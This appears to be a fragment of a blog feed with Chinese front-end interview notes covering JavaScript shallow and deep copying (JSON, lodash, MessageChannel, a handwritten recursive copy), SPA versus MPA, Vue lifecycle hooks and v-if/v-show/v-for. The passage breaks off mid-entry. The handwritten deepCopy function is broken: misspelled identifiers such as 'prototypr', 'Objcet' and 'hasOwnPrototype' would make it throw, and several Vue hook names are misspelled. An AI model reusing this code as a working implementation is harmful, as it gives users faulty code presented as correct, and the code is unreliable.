        <content type="html"><![CDATA[<blockquote><p>面试专栏：<a href="https://vue3js.cn/interview/JavaScript/copy.html#%E4%B8%80%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AD%98%E5%82%A8">https://vue3js.cn/interview/JavaScript/copy.html#一、数据类型存储</a></p><p>深拷贝浅拷贝：<a href="https://juejin.cn/post/7013603488315736072">https://juejin.cn/post/7013603488315736072</a></p><p>messagechannel：<a href="https://www.jianshu.com/p/4f07ef18b5d7">https://www.jianshu.com/p/4f07ef18b5d7</a></p><p>深拷贝函数：<a href="https://www.cnblogs.com/wangyong1997/p/13577725.html">https://www.cnblogs.com/wangyong1997/p/13577725.html</a></p></blockquote><h2 id="深拷贝-与-浅拷贝">深拷贝 与 浅拷贝<a title="#深拷贝-与-浅拷贝" href="#深拷贝-与-浅拷贝"></a></h2><p>在日常生产环境当中，使用完美方案—<code>lodash.cloneDeep</code>，面试问起来的话，重点使用递归实现，JSON、Object.assgin、MessageChannel都可以作为补充。</p><h3 id="1.-数据类型存储">1. 数据类型存储<a title="#1.-数据类型存储" href="#1.-数据类型存储"></a></h3><ul><li><p>基本类型：栈内存</p><blockquote><p>number、null、undefined、boolean、string、symbol、bigint</p></blockquote></li><li><p>引用类型：堆内存，引用数据类型的变量是一个指向堆内存中事对象的引用，存在栈中</p><blockquote><p>function、object、array、date、regexp、map、set</p></blockquote></li><li><p>浅拷贝：基本类型，拷贝数据；引用类型，拷贝内存地址；即共用引用类型数据。</p><blockquote><p><code>=</code> 从第一层的引用类型就是共享内存地址</p><p>浅拷贝是<strong>拷贝一层</strong>，深层次的引用类型则共享内存地址</p><p><strong>修改第一层的基本数据类型，是不会修改到其他对象的；</strong></p><p><strong>但是修改第一层引用类型下面的值时，全都是在操作一个内存地址的值</strong></p></blockquote></li><li><p>深拷贝：基本类型 和 引用类型都拷贝数据，不存在共用数据的现象</p><blockquote><p>修改任何对象的属性都不会改变另一个对象的属性</p></blockquote></li></ul><p>前提为拷贝类型为引用类型的情况下：</p><ul><li>浅拷贝是拷贝一层，属性为对象时，浅拷贝是复制，两个对象指向同一个地址</li><li>深拷贝是递归拷贝深层次，属性为对象时，深拷贝是新开栈，两个对象指向不同的地址</li></ul><h3 id="2.-浅拷贝">2. 浅拷贝<a title="#2.-浅拷贝" href="#2.-浅拷贝"></a></h3><ol><li><code>Object.assign(target,source[,source2])</code>  // Object Array</li><li>扩展运算符 <code>...</code>  // Object Array</li><li><code>Array.prototype.slice --- arrO.slice(0)</code>  // Array</li><li><code>Array.prototype.concat --- arrO.concat()</code> // Array</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="attr">a</span>:<span class="string">&#x27;aaa1&#x27;</span>,</span><br><span class="line">    <span class="attr">b</span>:&#123;</span><br><span class="line">        <span class="attr">b1</span>:<span class="string">&#x27;bbb1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">0</span>,[<span class="number">10</span>,<span class="number">11</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">// =</span></span><br><span class="line"><span class="keyword">let</span> obj2 = obj;</span><br><span class="line">obj2.<span class="property">a</span> = <span class="string">&#x27;aaa2&#x27;</span>; <span class="comment">// obj2.a === obj.a = &#x27;aaa2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// assign</span></span><br><span class="line"><span class="keyword">let</span> obj3 = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;,obj);</span><br><span class="line">obj3.<span class="property">a</span> = <span class="string">&#x27;aaa3&#x27;</span>;     <span class="comment">// obj3.a = &#x27;aaa3&#x27;  obj.a = &#x27;aaa2&#x27;  // obj.a 基本类型</span></span><br><span class="line">obj3.<span class="property">b</span>.<span class="property">b1</span> = <span class="string">&#x27;bbb3&#x27;</span>;  <span class="comment">// obj3.b === obj.b = &#123; b1: &#x27;bbb3&#x27;&#125;  // obj 跟着变化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">let</span> obj4 = &#123;...obj&#125;;</span><br><span class="line">obj4.<span class="property">a</span> = <span class="string">&#x27;aaa4&#x27;</span>;    <span class="comment">// obj.a = &#x27;aaa2&#x27; obj4.a = &#x27;aaa4&#x27;</span></span><br><span class="line">obj4.<span class="property">b</span>.<span class="property">b1</span> = <span class="string">&#x27;bbb4&#x27;</span>; <span class="comment">// obj.b.b1 === obj4.b.b1 = &#x27;bbb4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// slice</span></span><br><span class="line"><span class="keyword">let</span> arr2 = arr.<span class="title function_">slice</span>(<span class="number">0</span>);</span><br><span class="line">arr2[<span class="number">0</span>] = <span class="number">20</span>;    <span class="comment">// arr2[0] = 20  arr[0] = 0</span></span><br><span class="line">arr2[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">22</span>; <span class="comment">// arr[1] === arr2[1] = [11,22];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//concat</span></span><br><span class="line"><span class="keyword">let</span> arr3 = arr.<span class="title function_">concat</span>();</span><br></pre></td></tr></table></figure><h3 id="3.-深拷贝">3. 深拷贝<a title="#3.-深拷贝" href="#3.-深拷贝"></a></h3><ol><li><code>JSON.parse(JSON.stringify())</code></li><li><code>Jquery.extend()</code></li><li><code>_.cloneDeep()</code></li><li><code>MessageChannel</code></li><li>手写循环递归</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JSON.parse(JSON.stringify(obj))</span></span><br><span class="line"><span class="keyword">let</span> obj5 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj))</span><br><span class="line">obj5.<span class="property">a</span> = <span class="string">&#x27;aaa5&#x27;</span>;     <span class="comment">// obj5.a = &#x27;aaa5&#x27; obj.a = &#x27;aaa2&#x27;</span></span><br><span class="line">obj5.<span class="property">b</span>.<span class="property">b1</span> = <span class="string">&#x27;bbb5&#x27;</span>;  <span class="comment">// obj5.b.b1 = &#x27;bbb5&#x27;  obj.b.b1 = &#x27;bbb4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// jquery.extend</span></span><br><span class="line"><span class="keyword">const</span> $ = <span class="built_in">require</span>(<span class="string">&#x27;jquery&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> obj6 = $.<span class="title function_">extend</span>(<span class="literal">true</span>, &#123;&#125;, obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// _.cloneDeep</span></span><br><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> obj7 = _.<span class="title function_">cloneDeep</span>(obj)</span><br></pre></td></tr></table></figure><p>JSON.parse 的问题：</p><ul><li>会忽略 <code>undefined</code> 和 <code>symbol</code></li><li>不可以对 <code>Function </code> 进行拷贝，因为 JSON 格式字符串不支持 Function，在序列化时会自动删除</li><li>不支持循环对象的拷贝（对象的某个属性的值为其自己）</li><li>不能正确处理new Date</li><li>不能处理正则</li><li>不能处理 new Error()</li></ul><p>但遇到的深拷贝的场景很少，而且 99% 用 JSON.stringify 就可以解决</p><h5 id="3.-!-_.clonedeep">3. ! <code>_.cloneDeep</code><a title="#3.-!-_.clonedeep" href="#3.-!-_.clonedeep"></a></h5><blockquote><p>这是最最最最完美的深拷贝的方式，它已经将会出现问题的各种情况都考虑在内了，所以在日常项目开发当中，建议使用这种成熟的解决方案.</p><p>其实lodash解决循环引用的方式，就是用一个栈记录所有被拷贝的引用值，如果再次碰到同样的引用值的时候，不会再去拷贝一遍，而是利用之前已经拷贝好的。</p></blockquote><h5 id="4.messagechannel">4.<code>MessageChannel</code><a title="#4.messagechannel" href="#4.messagechannel"></a></h5><p>MessageChannel 允许我们创建一个新的消息通道，并通过其 postMessage 发送数据，ommessage 接收数据</p><blockquote><p>简单来说，<code>MessageChannel</code>创建了一个通信的管道，这个管道有两个端口，每个端口都可以通过<code>postMessage</code>发送数据，而一个端口只要绑定了<code>onmessage</code>回调方法，就可以接收从另一个端口传过来的数据。</p></blockquote><h6 id="4.1-使用-messagechannel">4.1 使用 MessageChannel<a title="#4.1-使用-messagechannel" href="#4.1-使用-messagechannel"></a></h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> channel = <span class="keyword">new</span> <span class="title class_">MessageChannel</span>();   <span class="comment">// 创建了一个管道</span></span><br><span class="line"><span class="keyword">var</span> port1 = channel.<span class="property">port1</span>;</span><br><span class="line"><span class="keyword">var</span> port2 = channel.<span class="property">port2</span>;             <span class="comment">// 获取实例的两个端口 只读</span></span><br><span class="line">port1.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;port1收的数据：&quot;</span> + event.<span class="property">data</span>);</span><br><span class="line">&#125;</span><br><span class="line">port2.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;port2收的数据：&quot;</span> + event.<span class="property">data</span>);</span><br><span class="line">&#125;</span><br><span class="line">port1.<span class="title function_">postMessage</span>(<span class="string">&quot;port1发的数据&quot;</span>);  <span class="comment">// port2收的数据：port1发的数据</span></span><br><span class="line">port2.<span class="title function_">postMessage</span>(<span class="string">&quot;port2发的数据&quot;</span>);</span><br></pre></td></tr></table></figure><h6 id="4.2-使用其进行深拷贝">4.2 使用其进行深拷贝<a title="#4.2-使用其进行深拷贝" href="#4.2-使用其进行深拷贝"></a></h6><p>MessageChannel 的 postMessage 传递数据也是 深拷贝的，与 web worker 的postMessage 一样，而且可以<strong>拷贝 undefined 和 循环引用的对象</strong></p><p>但拷贝<strong>有函数的对象时，会报错</strong>。而且是在 <strong>异步</strong>的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">deepcopy</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;port1, port2&#125; = <span class="keyword">new</span> <span class="title class_">MessageChannel</span>();</span><br><span class="line">        <span class="comment">// port2将port1 传过来的 obj 返回出去 obj此时就是深拷贝后的</span></span><br><span class="line">        port2.<span class="property">onmessage</span> = <span class="function"><span class="params">event</span> =&gt;</span> <span class="title function_">resolve</span>(event.<span class="property">data</span>); </span><br><span class="line">        port1.<span class="title function_">postMessage</span>(obj);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// copy 就是传出来的 深拷贝后的值</span></span><br><span class="line"><span class="title function_">deepcopy</span>(obj).<span class="title function_">then</span>(<span class="function">(<span class="params">copy</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> copyobj = copy;  <span class="comment">// copyobj 已经不等于 obj了 copy == copyobj ！= obj</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="5.-手写循环递归">5. 手写循环递归<a title="#5.-手写循环递归" href="#5.-手写循环递归"></a></h5><blockquote><p>判断一个对象的字段是否引用了这个对象或这个对象的任意父级，如果引用了父级，那么就直接返回同级的新对象，反之，进行递归的那套流程。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">deepCopy</span>(<span class="params">obj, cache = <span class="keyword">new</span> <span class="built_in">WeakMap</span>()</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="property">prototypr</span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object Function]&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;return &#x27;</span> + obj.<span class="title function_">toString</span>()).<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(obj == <span class="literal">null</span> || <span class="keyword">typeof</span> obj !== <span class="string">&#x27;object&#x27;</span>)&#123;  </span><br><span class="line">        <span class="comment">// == null 包含了 null 和 undefined</span></span><br><span class="line">        <span class="comment">// typeof 除 function 外的引用类型都是 object</span></span><br><span class="line">        <span class="comment">// 所以 不是funciton又不是其他引用类型的话 就是基本数据类型了</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 以下是对 除 function 外的引用类型的处理</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object Date]&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Objcet</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object RegExp]&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegExp</span>(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Objcet</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object Error]&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Error</span>(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cache.<span class="title function_">get</span>(obj))&#123;</span><br><span class="line">        <span class="keyword">return</span> cache.<span class="title function_">get</span>(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> copyObj = <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object Array]&#x27;</span> ? [] : &#123;&#125;;</span><br><span class="line">    <span class="comment">// let copyObj = Array.isArray(obj) ? [] : &#123;&#125;;</span></span><br><span class="line">    <span class="comment">// let copyObj = new obj.constructor();</span></span><br><span class="line">    cache.<span class="title function_">set</span>(obj,copyObj); <span class="comment">// 此时 copyObj 还没有数据，下面会进行添加</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> key <span class="keyword">in</span> obj)&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj.<span class="title function_">hasOwnPrototype</span>(key))&#123;  <span class="comment">// 用for in为什么还要判断key是否为obj的自身属性</span></span><br><span class="line"><span class="comment">// 辉哥说 因为 for in 遍历的是 可迭代的变量，当在其原型链上时，也是可迭代的，但是却不是本身属性</span></span><br><span class="line">            <span class="comment">// 递归拷贝</span></span><br><span class="line">            copyObj[key] = <span class="title function_">deepCopy</span>(obj[key],cache)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> copyObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单页面、多页面应用</title>
      <link href="/furtherNotes/further/06%20%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8%E5%92%8C%E5%A4%9A%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8"/>
      <url>/furtherNotes/further/06%20%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8%E5%92%8C%E5%A4%9A%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接</p><p><a href="https://www.jianshu.com/p/4c9c29967dd6">https://www.jianshu.com/p/4c9c29967dd6</a></p><p><a href="https://vue3js.cn/interview/vue/spa.html#%E4%BA%8C%E3%80%81spa%E5%92%8Cmpa%E7%9A%84%E5%8C%BA%E5%88%AB">https://vue3js.cn/interview/vue/spa.html#二、spa和mpa的区别</a></p></blockquote><h2 id="单页面应用与多页面应用的区别">单页面应用与多页面应用的区别<a title="#单页面应用与多页面应用的区别" href="#单页面应用与多页面应用的区别"></a></h2><h3 id="1.-多页面应用-mpa">1. 多页面应用 MPA<a title="#1.-多页面应用-mpa" href="#1.-多页面应用-mpa"></a></h3><p>多页面应用(multiPage-Page application)：每个页面都是一个主页面，都是独立的，当在访问另一个页面的时候，都需要重新加载 html、css、js 文件。<strong>每一次页面跳转时，后台服务器都会返回一个新的 html 文档。</strong></p><ul><li><p>优点：</p><ul><li><p><strong>首屏时间快</strong></p><p>页面首个屏幕的内容展现的时间，当访问页面时，服务器返回一个 html，页面就会展示出来，这个过程<u>只经历了一个 http 请求，所以页面展示的速度非常快</u>。</p></li><li><p><strong>seo 效果好</strong></p><p>搜索引擎在做页面排名的时候，要根据页面内容才能给网页权重，来进行网页的排名。<u>搜索引擎是可以识别 html</u> 内容的，而我们在每个页面所有的内容都放在 html 中，所以多页面应用seo排名效果好。</p></li></ul></li><li><p>缺点：</p><ul><li><p><strong>页面切换慢</strong></p><p><u>每次跳转都需要发出一个 http 请求</u>，如果网络比较慢，在页面之间来回跳转时，就会有明显的卡顿。</p></li></ul></li></ul><h3 id="2.-单页面应用-spa">2. 单页面应用 SPA<a title="#2.-单页面应用-spa" href="#2.-单页面应用-spa"></a></h3><p>单页面应用(single-page application)，通过动态重写当前页面来与用户交互，这种方法避免了页面之间切换打断用户体验在单页应用中，所有必要的代码（<code>HTML</code>、<code>JavaScript</code>和<code>CSS</code>）都通过单个页面的加载而检索，或者根据需要（通常是为响应用户操作）动态装载适当的资源并添加到页面，页面在任何时间点都不会重新加载。</p><ul><li><p>优点：</p><ul><li><p><strong>页面切换快</strong></p><p>页面每次切换跳转时，<u>不需要做 html 文件的请求，这样就节约了很多 http 发送时延</u>。</p></li></ul></li><li><p>缺点：</p><ul><li><p><strong>首屏时间稍慢</strong></p><p>首屏时需要请求一次<code>html</code>，同时还要发送一次<code>js</code>请求，两次请求回来了，首屏才会展示出来</p></li><li><p><strong>seo 差</strong></p><p>因为搜索引擎只认识<code>html</code>里的内容，不认识<code>js</code>的内容，<u>而单页应用的内容都是靠<code>js</code>渲染生成出来的，搜索引擎不识别这部分内容</u>，也就不会给一个好的排名，会导致单页应用做出来的网页在百度和谷歌上的排名差。</p></li></ul></li></ul><blockquote><p>vue 提供了一些其他技术来解决了单页面的缺点，比如服务端渲染 ssr，通过这些技术可以完美解决这些缺点。</p></blockquote><h3 id="3.-比较">3. 比较<a title="#3.-比较" href="#3.-比较"></a></h3><div class="φbq"><div class="φbs"><table><thead><tr><th style="padding:0"></th><th>多页应用模式MPA</th><th>单页应用模式SPA</th></tr></thead><tbody><tr><td>构成</td><td>由多个完整页面构成</td><td>一个外壳页面和多个页面片段构成</td></tr><tr><td><strong>跳转方式</strong></td><td><strong>整页刷新</strong>：页面之间的跳转是从一个页面跳转到另一个页面</td><td><strong>局部刷新</strong>：页面片段之间的跳转是把一个页面片段删除或隐藏，加载另一个页面片段并显示出来。这是片段之间的模拟跳转，并没有开壳页面</td></tr><tr><td><strong>跳转后公共资源是否重新加载</strong></td><td>是</td><td>否</td></tr><tr><td><strong>URL模式</strong></td><td><strong>历史模式</strong><br /><code>http://xxx/page1.html 和 http://xxx/page2.html</code></td><td><strong>哈希模式</strong><br /><code>http://xxx/shell.html#page1 和 http://xxx/shell.html#page2</code></td></tr><tr><td><strong>页面切换</strong></td><td>页面间切换加载慢，不流畅，用户体验差，特别是在移动设备上</td><td>页面片段间的切换快，用户体验好，包括在移动设备上</td></tr><tr><td>能否实现转场动画</td><td>无法实现</td><td>容易实现（手机<code>app</code>动效）</td></tr><tr><td><strong>页面间传递数据</strong></td><td>依赖<code>URL、cookie</code>或者<code>localstorage</code>，实现麻烦</td><td>因为在一个页面内，页面间传递数据很容易实现(这里是我补充，父子之间传值，或<code>vuex</code>或<code>storage</code>之类)</td></tr><tr><td><strong>搜索引擎优化（SEO）</strong></td><td>可以直接做</td><td>需要单独方案做，有点麻烦，可通过 ssr 改善</td></tr><tr><td>特别适用的范围</td><td>需要对搜索引擎友好的网站</td><td>对体验要求高的应用，特别是移动应用</td></tr><tr><td></td><td></td><td></td></tr><tr><td>开发难度</td><td>低一些，框架选择容易</td><td>高一些，需要专门的框架来降低这种模式的开发难度</td></tr></tbody></table></div></div>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue生命周期</title>
      <link href="/furtherNotes/further/04%20vue%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"/>
      <url>/furtherNotes/further/04%20vue%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F</url>
      
        <content type="html"><![CDATA[<h2 id="vue-生命周期">vue 生命周期<a title="#vue-生命周期" href="#vue-生命周期"></a></h2><ul><li><p>beforeCreate：<u>data 和 methods 中的数据还没有初始化</u></p></li><li><p>created：<u>data 和 methods 已经被初始化了</u>，<strong>要调用 methods 或 操作 data 中的数据最早只能在这</strong></p></li><li><p>beforeMount：（模板在内存中编译好，还未挂载到页面上）<u>页面的元素还没被替换过来，还是之前的模板字符串</u>，[render 函数在这被调用，生成虚拟 DOM ]</p></li><li><p>mounted：<u>内存中的模板已经真实的挂载到页面中</u>，是实例创建期间的最后一个生命周期，执行完 mounted 就表示实例已经被完全创建好了，<strong>要通过某些插件操作页面上的 DOM 节点，最早要在这</strong></p></li><li><p>beforeUpdate：组件运行阶段的生命周期，<u>页面中显示的数据还未更新，但data数据是最新的</u>，[数据更新后，新的虚拟 DOM 生成，但还没跟旧虚拟 DOM 对比补丁]</p></li><li><p>update：<u>页面和data已经保持同步了</u>，[新的虚拟 DOM 对比补丁后，进行真实 DOM 的更新]</p></li><li><p>beforeDestory：vue实例进入销毁阶段，实例上所有的 data methods 过滤器 指令<u>都处于可用状态</u>，此时还未真正执行销毁</p></li><li><p>destoryed：组件已经被完全销毁，此时组件中所有的 data methods… 都<u>已经不可用了</u></p></li><li><p>activated：keep-alive 专属，组件被激活时调用</p></li><li><p>deactivated：keep-alive 专属，组件被销毁时调用</p></li></ul><p><strong>Q：异步请求在哪里发起？</strong></p><p>可以在钩子函数 created、beforeMount、mounted 中进行异步请求，因为这三个函数中，<strong>data 已经创建，可以将服务器端返回的数据进行赋值</strong></p><p>如果异步请求不需要依赖 dom 推荐在 created 函数中调用异步请求，优点有：</p><ul><li>能更快获取到服务器数据，减少页面 loading 时间</li><li>ssr 不支持 beforeMount、mounted 钩子函数，所以放在 created 中有助于一致性</li></ul>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>v-if、v-for、v-show</title>
      <link href="/furtherNotes/further/05%20v-if%20%E4%B8%8E%20v-show%20v-for"/>
      <url>/furtherNotes/further/05%20v-if%20%E4%B8%8E%20v-show%20v-for</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：</p><p><a href="https://vue3js.cn/interview/vue/show_if.html#%E4%B8%80%E3%80%81v-show%E4%B8%8Ev-if%E7%9A%84%E5%85%B1%E5%90%8C%E7%82%B9">https://vue3js.cn/interview/vue/show_if.html#一、v-show与v-if的共同点</a></p></blockquote><blockquote><p><a href="https://juejin.cn/post/6984210440276410399#heading-18">https://juejin.cn/post/6984210440276410399#heading-18</a></p><p><a href="https://vue3js.cn/interview/vue/if_for.html#%E4%BA%8C%E3%80%81%E4%BC%98%E5%85%88%E7%BA%A7">https://vue3js.cn/interview/vue/if_for.html#二、优先级</a></p></blockquote><h2 id="v-if-与-v-show-的区别、v-if-为什么不建议与-v-for-一起使用">v-if 与 v-show 的区别、v-if 为什么不建议与 v-for 一起使用<a title="#v-if-与-v-show-的区别、v-if-为什么不建议与-v-for-一起使用" href="#v-if-与-v-show-的区别、v-if-为什么不建议与-v-for-一起使用"></a></h2><h3 id="1.-v-show-与-v-if-的区别">1. v-show 与 v-if 的区别<a title="#1.-v-show-与-v-if-的区别" href="#1.-v-show-与-v-if-的区别"></a></h3><ul><li><p>控制手段：</p><ul><li>v-show：显示隐藏式为该元素<strong>添加 display 属性</strong>，dom 元素一直存在</li><li>v-if：显示隐藏式将 <strong>dom 元素整个添加或删除</strong></li></ul></li><li><p>编译条件：</p><ul><li><p>v-show：会<strong>被编译成指令</strong>，条件不满足时控制样式将对应节点隐藏</p></li><li><p>v-if：会<strong>被转换成三元表达式</strong>，条件不满足时不渲染</p><blockquote><p>是真正的条件渲染，它会确保在切换过程中，条件块内的事件监听器和子组件销毁和重建，只有渲染条件为假时，不做操作，</p></blockquote></li></ul></li><li><p>编译过程：</p><ul><li>v-show：简单的<strong>基于 css 切换</strong></li><li>v-if：有一个<strong>局部编译 / 卸载过程</strong>，切换过程中适当地销毁和重建内部的事件监听和子组件</li></ul></li><li><p>状态切换：</p><ul><li><p>v-show：<strong>不会触发生命周期</strong></p></li><li><p>v-if：false → true 触发组件的 beforeCreate、created、beforeMount、mounted；</p><p>​          true → false 触发组件 beforeDestory、destoryed</p></li></ul></li><li><p>性能消耗：</p><ul><li>v-show：有更高的<strong>初始化渲染消耗</strong></li><li>v-if：有更高的<strong>切换消耗</strong></li></ul></li></ul><h3 id="2.-v-if-不建议与-v-for-一起使用">2. v-if 不建议与 v-for 一起使用<a title="#2.-v-if-不建议与-v-for-一起使用" href="#2.-v-if-不建议与-v-for-一起使用"></a></h3><p>v-if 和 v-for 都是 vue 模板系统中的指令，在 vue 模板编译的时候，会将指令系统转化成可执行的 render 函数。</p><p><strong>v-for 比 v-if 的优先级高</strong>，当 v-if 和 v-for 在同一个标签时，会先遍历渲染，然后再进行判断是否展示，所以就会渲染一些无用节点，增加无用的 dom 操作，可以<strong>通过 computed 或者 &lt;template&gt; 解决</strong></p><blockquote><p>eg：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">&quot;item in [1, 2, 3, 4, 5, 6, 7]&quot;</span> <span class="attr">v-if</span>=<span class="string">&quot;item !== 3&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;item&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的写法是<code>v-for</code>和<code>v-if</code>同时存在，会先把7个元素都遍历出来，然后再一个个判断是否为3，并把3给隐藏掉，这样的坏处就是，<strong>渲染了无用的3节点，增加无用的dom操作，建议使用computed来解决</strong>这个问题：</p><figure class="highlight 